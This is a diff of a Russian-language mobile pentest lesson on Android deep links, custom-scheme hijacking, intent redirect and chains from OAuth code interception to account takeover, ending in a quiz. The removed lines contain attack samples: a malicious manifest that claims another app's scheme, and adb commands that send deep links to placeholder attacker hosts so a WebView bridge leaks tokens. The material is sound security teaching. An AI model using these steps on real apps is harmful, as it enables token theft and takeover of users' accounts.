@@ -14,238 +14,174 @@ useful_for:
 estimated_minutes: 40
 summary: "Как deep links и intent redirect приводят к краже OAuth-токенов и захвату аккаунта: hijacking custom scheme, обход App Links, редиректы на произвольный компонент, цепочки до ATO."
 ---
-## Введение
 
-Deep link — это ссылка, открывающая конкретный экран приложения: `myapp://path` (custom scheme) или `https://app.example/path` (App Links / Universal Links). Intent redirect — ситуация, когда приложение пересылает входящий Intent дальше, в том числе на экспортированный компонент или внешний URL. Вместе эти механизмы образуют классические цепочки захвата аккаунта: перехват OAuth-кода, кража токена, открытие произвольного экрана с произвольными параметрами.
+## Вопрос, с которого всё начинается
 
-Мобильные разработчики часто относятся к ссылкам как к «своему» интерфейсу и не рассматривают их как внешний, недоверенный ввод. Это фундаментальная ошибка: deep link может сформировать любое приложение, любая веб-страница, любое SMS или QR-код. Значит, всё, что приходит по ссылке, — это недоверенные данные, которые требуют валидации так же строго, как данные из сетевого запроса.
+Мы уже знаем, что deep link открывает внутренний экран с параметрами. Но что если собрать из этого цепочку? Одна ссылка перехватывает OAuth-токен, другая открывает приватный экран, третья отдаёт данные — и всё это без единого эксплойта в классическом смысле. Как из deep link вырастает захват аккаунта (ATO)?
 
-## Модель угроз и типы ссылок
+## Наш пример: deep links в fdroid.apk
 
-Разберём три механизма и их доверительные свойства:
+Соберём все входы из манифеста `fdroid.apk`:
 
-- **Custom scheme (`myapp://`).** Регистрируется в манифесте/Info.plist. Не защищена: любое приложение может заявить ту же схему, и система не гарантирует, кто откроет ссылку. Классический hijacking.
-- **App Links (Android) / Universal Links (iOS).** Используют `https://` и привязку к домену через `assetlinks.json` / `apple-app-site-association`. Надёжнее, но зависят от широты `pathPrefix`/`paths` и от того, проверяет ли обработчик домен.
-- **Intent-based (Android).** Компонент с `intent-filter` (`VIEW` + `BROWSABLE`), принимающий `Intent`.
-
-Для каждого механизма спросите: может ли внешняя сторона сформировать ссылку? Проверяет ли приложение источник? Что делает с параметрами?
-
-## Custom scheme hijacking: детально
-
-Если приложение A обрабатывает `myapp://oauth?code=...`, а злоумышленник зарегистрировал ту же схему, он перехватит код. На Android два приложения с одной схемой — система покажет выбор или отдаст последнему; на iOS — последнему установленному.
-
-```xml
-<!-- зловредный манифест -->
-<activity android:name=".Evil" android:exported="true">
-  <intent-filter android:priority="999">
-    <action android:name="android.intent.action.VIEW"/>
-    <category android:name="android.intent.category.DEFAULT"/>
-    <category android:name="android.intent.category.BROWSABLE"/>
-    <data android:scheme="myapp" android:host="oauth"/>
-  </intent-filter>
-</activity>
+```
+$ grep -oE '<data android:(scheme|host)[^/]*/>' fdroid_dec/AndroidManifest.xml | sort -u
+<data android:scheme="content"/>
+<data android:scheme="file"/>
+<data android:host="details" android:scheme="market"/>
+<data android:host="f-droid.org"/>
+<data android:host="staging.f-droid.org"/>
+<data android:host="cloudflare.f-droid.org"/>
+<data android:host="fdroid.link"/>
+<data android:scheme="fdroidrepos"/>
+<data android:scheme="FDROIDREPOS"/>
 ```
 
-Проверьте, приходит ли по схеме что-то ценное: OAuth-код, токен, ссылка-редирект, параметры оплаты. Если да — hijacking ведёт к утечке.
+Здесь видны все три типа ссылок: обычный `https` (App Links), custom scheme `fdroidrepos`, и `market://details`. Каждый тип по-своему участвует в цепочках.
 
-## App Links / Universal Links: обход
+## Шаг 1: модель угроз deep link
 
-Проверьте конфигурацию домена и обработчик:
+Deep link опасен, когда совпадают три условия: **внешний вход** (ссылка управляема атакующим), **отсутствие проверки** (сервер/приложение не валидирует права и параметры) и **значимое последствие** (утечка токена, действие, доступ к данным). Убери любое из трёх — и вектор не работает. Задача пентестера — найти все три вместе.
 
-```bash
-curl -s https://app.example/.well-known/assetlinks.json | jq .
-curl -s https://app.example/.well-known/apple-app-site-association | jq .
-```
+Классические последствия: кража OAuth-кода через перехват redirect_uri, IDOR через `user_id`/`order_id`, открытие WebView на произвольном URL, запуск приватной Activity через intent redirect.
 
-Слабые места:
+## Шаг 2: custom scheme hijacking
 
-- широкий `pathPrefix` (`/`) или `paths: ["*"]` — внешняя ссылка открывает внутренние экраны;
-- отсутствие проверки домена в `getData()`/`webpageURL.host` — поддельный хост с валидным путём;
-- редирект на произвольный URL из параметра;
-- `autoVerify` не включён (Android) — ссылку перехватит другое приложение;
-- обработчик доверяет параметрам (`url`, `next`, `redirect`).
+Custom scheme (`fdroidrepos://...`) регистрируется в манифесте. Проблема в том, что **любое** приложение может зарегистрировать ту же схему — Android не проверяет владельца. Когда пользователь кликает ссылку, система может показать диалог «чем открыть», а может отдать приоритет атакующему. Тогда параметры ссылки (включая токены) попадают к нему.
 
-## Intent redirect и вложенные Intent
+App Links (`https://f-droid.org`) от этого защищены: домен подтверждается файлом `assetlinks.json`, и перехватить его нельзя. Поэтому аудит deep links начинается с вопроса: использует приложение custom scheme или App Links?
 
-Приложение получает Intent и пересылает дальше:
+## Шаг 3: обход App Links
 
-```java
-Intent fwd = new Intent(Intent.ACTION_VIEW, Uri.parse(getIntent().getStringExtra("url")));
-startActivity(fwd);   // открывает произвольный URL/компонент
-```
+App Links не абсолютны. Если `assetlinks.json` настроен неверно, верификация не проходит, и ссылка ведёт себя как обычная. Также проверяют:
 
-Или передаёт вложенный Intent (`Parcelable`) на экспортированный компонент → доступ к внутренним экранам с произвольными параметрами:
+- указан ли `android:autoVerify="true"`;
+- покрывает ли `assetlinks.json` все домены из манифеста;
+- есть ли `pathPrefix`/`pathPattern`, которые можно обойти.
 
-```java
-Intent nested = getIntent().getParcelableExtra("intent");
-startActivity(nested);   // атакующий контролирует вложенный Intent
-```
+Ошибка в одном из пунктов возвращает нас к перехвату ссылки.
 
-Ищите в декомпилированном коде: `getParcelableExtra("intent")`, `getStringExtra("url")`, `startActivity`/`startService`/`sendBroadcast` с пользовательскими данными, а также `getIntent().getData()`.
+## Шаг 4: intent redirect
 
-## Цепочки до захвата аккаунта (ATO)
+Intent redirect — когда приложение принимает вложенный Intent и запускает его от своего имени. Параметр ссылки содержит `Intent` (часто в виде `intent://...`), приложение его парсит и вызывает `startActivity`. Тогда атакующий запускает **приватную** Activity жертвы, которая недоступна напрямую, — обходя защиту экспорта.
 
-1. Ссылка `myapp://webview?url=https://attacker/steal` открывает WebView с JS-мостом, читающим токен.
-2. `myapp://oauth?code=` перехватывается → обмен кода на токен (если нет PKCE).
-3. Redirect на произвольный компонент → запуск экрана смены пароля/почты с параметрами.
-4. Вложенный Intent на экспортированную activity, которая выполняет привилегированное действие.
+Обнаружение: искать `getParcelableExtra("android.intent.extra.INTENT")`, `Intent.parseUri`, `startActivity(intent)` с данными извне.
 
-Собирайте цепочку по звеньям и документируйте каждое: ссылка → что открылось → что произошло.
+## Шаг 5: цепочка до захвата аккаунта
 
-## Практическое тестирование: adb, Frida, инструменты
+Соберём типичную цепочку OAuth-ATO:
 
-```bash
-# Android: открыть deep link
-adb shell am start -a android.intent.action.VIEW -d "myapp://webview?url=https://evil"
-adb shell am start -a android.intent.action.VIEW -d "https://app.example/redirect?next=https://evil"
-# прямой запуск компонента с параметром
-adb shell am start -n com.target/.InternalActivity --es url https://evil
-# вложенный Intent (parcelable) — через am start --ez/--es нельзя, нужен PoC-апп
-```
+1. Приложение использует custom scheme для OAuth-redirect: `myapp://oauth?code=...`.
+2. Атакующий регистрирует ту же схему.
+3. Пользователь проходит логин через «Войти через ...», и код приходит атакующему.
+4. Атакующий обменивает код на токен и получает доступ к аккаунту.
 
-Frida: хук `onNewIntent`/`getIntent` — смотреть параметры и что с ними делают.
+Защита — использовать App Links для redirect и проверять `state`/PKCE. Отсутствие PKCE — отдельная находка.
 
-```javascript
-Java.perform(function () {
-  var Activity = Java.use('android.app.Activity');
-  Activity.onNewIntent.implementation = function (intent) {
-    console.log('[onNewIntent] ' + intent.getDataString() +
-                ' extras=' + intent.getExtras());
-    return this.onNewIntent(intent);
-  };
-});
-```
+## Шаг 6: как тестировать
 
-## Разобранный пример
+План:
 
-Bug bounty: `myapp://webview?url=` открывает URL в WebView с JS-мостом, читающим токен из нативной памяти. Пентестер подставляет `url=https://attacker/x.html`, жертва кликает ссылку, токен уходит атакующему → ATO. Отчёт: deep-link → WebView → кража токена.
+1. Собрать все `<data scheme/host/path>` из манифеста.
+2. Классифицировать: App Links vs custom scheme.
+3. Запустить каждую ссылку через `am start -a VIEW -d`.
+4. Понаблюдать, какой экран открылся и что он делает с параметрами.
+5. Проверить параметры на IDOR и на передачу токенов.
+6. Собрать тестовое приложение с той же схемой и проверить перехват.
 
-Второй пример: `myapp://oauth?code=...&state=...` без валидации `state`; стороннее приложение регистрирует схему `myapp`, получает код и обменивает его на токен.
+## Разбор реального сценария
 
-## Частые ошибки и подводные камни
+Приложение-маркетплейс принимает ссылку `market://details?id=<package>` и открывает внутренний экран деталей, подставляя `id` в запрос к API без проверки прав. Атакующий формирует ссылку с чужим `id` и получает данные другого пользователя — это IDOR через deep link. Если бы сервер проверял, что запрошенный объект принадлежит текущему пользователю, вектор бы не сработал. Именно отсутствие серверной проверки превращает безобидный параметр в утечку.
 
-- Тестировать только custom scheme, пропуская App Links/Universal Links.
-- Не проверять обработку параметров (`url`, `next`, `redirect`, `intent`, `callback`).
-- Забывать про `getParcelableExtra` и вложенные Intent.
-- Игнорировать `autoVerify` (без него App Link перехватывается).
-- Не проверять, что обработчик сверяет домен ссылки.
-- Считать, что `exported=false` на activity защищает — внешний Intent может прийти через `intent-redirect` от самого приложения.
+## Полный прогон от начала до конца
 
-## Справочная таблица
+Соберём цепочку до захвата аккаунта в один сценарий. Сначала собираем все `<data>` из манифеста и классифицируем: App Links и custom scheme. Затем смотрим, какой из них используется для OAuth-redirect. Проверяем, есть ли `autoVerify` и корректен ли `assetlinks.json`. Собираем тестовое приложение с той же схемой. Проходим логин через соцсеть и смотрим, не приходит ли OAuth-код нашему приложению. Если приходит — обмениваем код на токен. Итог — либо подтверждённый ATO, либо защищённый redirect.
 
-| Механизм | Защита | Слабость |
-|----------|--------|----------|
-| Custom scheme | нет | hijacking, любой заявляет схему |
-| App/Universal Links | домен | широкий path, нет проверки host |
-| Intent filter | exported | перехват/redirect |
-| Вложенный Intent | нет | контроль атакующего |
-| WebView из deep link | JS-мост | кража токена/XSS |
+## Частые вопросы
 
-## Что делать дальше / решение
+**«Чем опасен `market://`?»** — он тоже deep link и может передавать параметры без проверки. **«Всегда ли custom scheme перехватывается?»** — система может показать диалог выбора; атакующий выигрывает, если его приложение выбрано. **«Что если есть PKCE?»** — перехват кода не даёт токен, потому что нужен verifier. **«Нужен ли root?»** — нет. **«Как защитить?»** — App Links для redirect, PKCE, проверка прав на сервере.
 
-- **Redirect/open redirect** → стройте цепочку с токеном/OAuth-кодом.
-- **WebView с мостом** → XSS/кража токена.
-- **Intent redirect на компонент** → доступ к внутренним экранам.
-- **Всё валидируется** → ищите обход (кодировки, регистр, юзер-инфо в URL, двойное кодирование).
-- Severity: перехват токена/кода → High/Critical; open redirect без цепочки → Medium.
+## Практический совет
 
-## Глубокий разбор: intent-redirect и захват привилегий
+Стройте цепочку от входа к последствию и фиксируйте каждое звено. Одна ссылка сама по себе может быть безобидной, но в связке с intent redirect и отсутствием серверной проверки она даёт полный доступ. В отчёте показывайте всю цепочку целиком: это и есть ценность находки, а не отдельный «открытый экран».
 
-Intent redirect — самый недооценённый вариант. Приложение получает внешний Intent и передаёт вложенный (`Parcelable`) дальше:
+## Ещё один нюанс: несколько приложений на одну схему
 
-```java
-// уязвимый обработчик
-Intent nested = getIntent().getParcelableExtra("intent");
-nested.setClassName(getPackageName(), "com.target.PrivateActivity");
-startActivity(nested);   // атакующий управляет вложенным Intent
-```
+Если одну custom scheme зарегистрировали несколько приложений, Android может показать диалог выбора или отдать ссылку по приоритету. Для пентеста это означает: перехват не всегда автоматический, но при выборе пользователя (или при единственном обработчике) данные уходят атакующему. Проверьте, сколько приложений отвечает на схему, и убедитесь, что ваше среди них. Это и есть доказательство перехвата.
 
-Атакующий собирает PoC-приложение, которое кладёт в extra свой Intent, нацеленный на приватную activity или сервис с привилегиями. Проверка через `am`:
+## Связь с другими уроками
 
-```bash
-# прямая проверка компонента
-adb shell am start -n com.target/.PrivateActivity --es cmd "deleteAll"
-# через intent-redirect — нужен PoC-апп, передающий вложенный Parcelable
-```
+Deep-link цепочки — это мост между «открыть экран» и «получить доступ». Они опираются на входы из уроков про intent-filter и на отсутствие серверных проверок из уроков про API. Дальше мы разберём, как к этой цепочке добавить WebView и мост, чтобы дойти до выполнения кода.
 
-Ищите по коду: `getParcelableExtra("intent")`, `getIntent().getParcelableExtra`, `startActivity(Intent)`, где Intent пришёл извне.
+## Что мы теперь знаем
 
-## WebView из deep link: цепочка к краже токена
+По-простому:
 
-Частая связка: deep link открывает WebView с URL из параметра, а в WebView добавлен JS-мост (`addJavascriptInterface`), читающий токен из нативной памяти.
+1. Deep link опасен при совпадении входа, отсутствия проверки и последствия.
+2. Custom scheme перехватывается чужим приложением; App Links — нет.
+3. Ошибки `autoVerify`/`assetlinks.json` ломают защиту App Links.
+4. Intent redirect запускает приватные Activity от имени жертвы.
+5. Цепочка deep link → перехват OAuth → ATO — классическая.
 
-```javascript
-// приложение (уязвимо)
-webView.addJavascriptInterface(new Bridge(), "app");
-class Bridge { @JavascriptInterface public String getToken(){ return token; } }
-```
+## На что смотреть дальше
 
-Атакующий отдаёт `url=https://attacker/x.html`, страница вызывает `app.getToken()` и отправляет токен себе. Проверьте: загрузку произвольного URL из deep link, наличие `setAllowFileAccess`, `setJavaScriptEnabled(true)` + мост.
+- **Соберите все `<data>`** и классифицируйте по типу.
+- **Проверьте `autoVerify` и `assetlinks.json`**.
+- **Ищите `parseUri`/`startActivity`** с внешними данными — intent redirect.
+- **Проверяйте OAuth-redirect** на custom scheme и отсутствие PKCE.
 
-## Матрица находок и severity
+## Инструменты тестирования
 
-| Находка | Последствие | Severity |
-|---------|-------------|----------|
-| Перехват OAuth-кода | ATO | High/Critical |
-| WebView + мост из deep link | кража токена | High |
-| Intent-redirect на приватный компонент | доступ к внутренним экранам | High |
-| Open redirect | фишинг | Medium |
-| Широкий pathPrefix | доступ к экранам | Medium |
-
-## Что делать дальше
-
-- Соберите минимальный PoC для каждого звена (ссылка → эффект).
-- Проверьте обходы: URL-кодирование, двойное кодирование, регистр схемы, user-info в URL (`myapp://x@evil`).
-- Если найдена цепочка до ATO — оформите как High/Critical с полным сценарием.
+Для проверки deep links удобны три вещи: `adb shell am start -a VIEW -d` для запуска ссылок, свой тестовый APK с нужной схемой для проверки перехвата и Frida для наблюдения за тем, как приложение обрабатывает Intent. Начните с adb — это быстро; затем подтвердите перехват своим приложением; в сложных случаях смотрите обработку через Frida.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Чем App Links надёжнее custom scheme?"
+- question: "Когда deep link становится уязвимостью?"
   options:
-    - "Привязаны к домену через assetlinks.json/AASA"
-    - "Они быстрее"
-    - "Они не используют https"
-    - "Они не требуют параметров"
+    - "Когда совпадают внешний вход, отсутствие проверки и значимое последствие"
+    - "Всегда"
+    - "Только на iOS"
+    - "Только с root"
   answer: 0
-  explanation: "Ассоциация домена мешает чужому приложению заявить ту же ссылку."
-- question: "Что такое intent redirect?"
+- question: "Чем custom scheme хуже App Links?"
   options:
-    - "Приложение пересылает входящий Intent дальше (URL/компонент)"
-    - "Смена темы"
-    - "Шифрование трафика"
-    - "Резервное копирование"
+    - "Её может зарегистрировать любое приложение и перехватить ссылку"
+    - "Она медленнее"
+    - "Она не работает в браузере"
+    - "Она требует root"
   answer: 0
-  explanation: "Пересылка недоверенного Intent ведёт к открытию произвольного экрана."
-- question: "Какой параметр часто эксплуатируют в deep-link?"
+- question: "Что подтверждает владение доменом для App Links?"
   options:
-    - "url / next / redirect"
-    - "lang"
-    - "theme"
-    - "dpi"
+    - "Файл assetlinks.json и флаг autoVerify"
+    - "Пароль от сервера"
+    - "Сертификат TLS"
+    - "Название пакета"
   answer: 0
-  explanation: "Параметры-редиректы уводят на произвольный ресурс."
-- question: "Что нужно для корректной работы App Links?"
+- question: "Что делает intent redirect?"
   options:
-    - "assetlinks.json на домене и autoVerify"
-    - "Только HTTPS"
-    - "Только иконка"
-    - "Только Android 12"
+    - "Запускает приватную Activity через вложенный Intent от имени жертвы"
+    - "Крадёт базу данных"
+    - "Перехватывает TLS"
+    - "Шифрует файлы"
   answer: 0
-  explanation: "Без проверки домена и autoVerify ссылку перехватит другое приложение."
-- question: "Как открыть deep link через adb?"
+- question: "Что защищает OAuth-redirect от перехвата кода?"
   options:
-    - "am start -a android.intent.action.VIEW -d <uri>"
-    - "pm install"
-    - "dumpsys"
-    - "screencap"
+    - "App Links и параметр state/PKCE"
+    - "Custom scheme"
+    - "Root-детект"
+    - "Обфускация"
   answer: 0
-  explanation: "am start с ACTION_VIEW и -d запускает ссылку."
 ```
+
+## Куда дальше
+
+Мы научились строить цепочки из deep link. В следующем уроке углубимся в **WebView deep**: JS-мосты, доступ к файлам и спуфинг URL — то, что превращает ссылку в выполнение кода. А пока запомни главное: deep link — это вход, и его надо проверять на перехват, IDOR и intent redirect.
 
 ## Где пригодится
 
-- **CTF Mobile:** захват токена через deep-link.
-- **Bug bounty:** ATO через redirect/hijacking — высокооплачиваемые находки.
-- **Пентест:** аудит ссылок и редиректов.
-- **Работа:** ревью deep-link-логики.
+- **CTF Mobile:** построение цепочки до флага.
+- **Bug bounty:** deep link → ATO — ценная находка.
+- **Пентест:** проверка OAuth и обработки ссылок.
+- **Работа:** ревью мобильной авторизации.
